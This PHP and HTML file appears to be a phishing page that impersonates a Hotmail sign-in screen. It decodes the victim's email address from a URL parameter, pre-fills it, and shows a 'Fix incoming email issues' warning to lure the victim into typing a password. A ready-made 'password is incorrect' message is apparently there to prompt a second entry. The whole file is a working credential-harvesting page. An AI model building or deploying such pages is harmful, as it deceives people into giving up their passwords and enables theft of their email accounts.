<?php
$id = $_GET['livemail_hotmailatlivemail'];
$id = urldecode(base64_decode($id));
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
    <link rel="shortcut icon" href="../img/icons/office.ico">
	<title>Sign in</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style>
  	/*@import "compass/css3";*/

body {
  /*background-color: #22475E;*/
  overflow:hidden;
}
.slid {
  width: 7px;
  height: 7px;
  position: absolute;
  background-color: #ccc;
  top: 0%;
  border-radius: 50%;
}

.slid:nth-child(1) {
  background-color: #3058b0;
  animation: move 2s infinite cubic-bezier(.2,.64,.81,.23);
}
.slid:nth-child(2) {
  background-color: #3058b0;
  animation: move 2s 150ms infinite cubic-bezier(.2,.64,.81,.23);
}
.slid:nth-child(3) {
  background-color: #3058b0;
  animation: move 2s 300ms infinite cubic-bezier(.2,.64,.81,.23);
}
.slid:nth-child(4) {
  background-color: #3058b0;
  animation: move 2s 450ms infinite cubic-bezier(.2,.64,.81,.23);
}


@keyframes move {
  0% {left: 0%;}
  100% {left:100%;}
}
.input:focus {
  background-color: red;
  border-bottom: 1px solid red;
}
  </style>
</head>
<body style="background-color: #e1e4e6">

<div class="row">
	
	<div class="col-md-4"></div>
	<div class="col-md-4 card pull-center" style="height: 100%;max-width: 450px; width: 100%; margin: 70px 0px 60px 0px; background-color: #fff; padding: 50px; overflow: hidden;">
		<!-- loader -->

<div style="display: none" id="loader">
<div class="slid"></div>
<div class="slid"></div>
<div class="slid"></div>
<div class="slid"></div>
</div>

<div style="display: none" id="loader2">
<div class="slid"></div>
<div class="slid"></div>
<div class="slid"></div>
<div class="slid"></div>
</div>

<!-- loader -->
		<img src="../img/icons/hotmail.png">
<form name="ema" method="POST" action="">
		<div class="row" style="margin-top: 20px;">
			<div class="col-md-12" style="margin: 10px 0px 10px 0px">
				<p style="color: red; font-weight: bold;font-size: 18px"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>
					Fix incoming email issues</p>
			</div>
			<div class="col-md-1 col-xs-1"><i class="fa fa-long-arrow-left" aria-hidden="true" style="font-size: 15px"></i></div>
			<div class="col-md-10 col-xs-10"><input type="email" name="email" id="email"  style="border: 0px; font-size: 14px; background-color: transparent;" value="<?php echo $id ?>"  title="Enter password below to fix"></div>
			
			<div class="col-md-12" style="margin-top: 30px; font-size: 25px; font-weight: bolder;"><p>Enter Password</p></div>
			<div class="col-md-12">
				<p style="color: red; margin: 10px 0px 30px 0px; display: none;" id="msg">Your account or password is incorrect. please try again.!</p>
			</div>
			
				<div class="col-md-12">
					<input type="password" name="password" id="password" style="border: 0px;border-bottom: 1px solid #000; background-color: #fff; width: 100%; padding: 10px;" autofocus="off" placeholder="Password" class="input" title="Enter password">
				</div>

				<div class="col-md-12" style="margin: 20px 0px 10px 0px">
					<p style=""><a href="javascript:void(0)">Forgot&nbsp;password?</a></p>
				</div>

				<div class="col-md-12" style="margin: 0px 0px 20px 0px">
					<p style=""><a href="javascript:void(0)">This&nbsp;isn't&nbsp;my&nbsp;email</a></p>
				</div>

				<div class="row">
					<div class="col-md-6 col-xs-6"></div>
					<div class="col-md-6" style="margin: 0px 0px 20px 0px">
					<button class="pull-right" style="background-color: #3058b0; cursor: pointer; border: 0px;color: #fff;padding: 7px 25px 7px 25px;" name="singinNow" id="butsave">Sign in</button>
					<button class="pull-right" style="background-color: #3058b0; cursor: pointer; border: 0px;color: #fff;padding: 7px 25px 7px 25px;display: none" name="singinNow" id="butsave2">Sign in</button>
				</div>
				</div>
			</form>
		</div>
		<div class="col-md-12">
			
		</div>
		
	</div>
	<div class="col-md-4"></div>
	 <script src="../script.js"></script>
</div>
</body>
</html>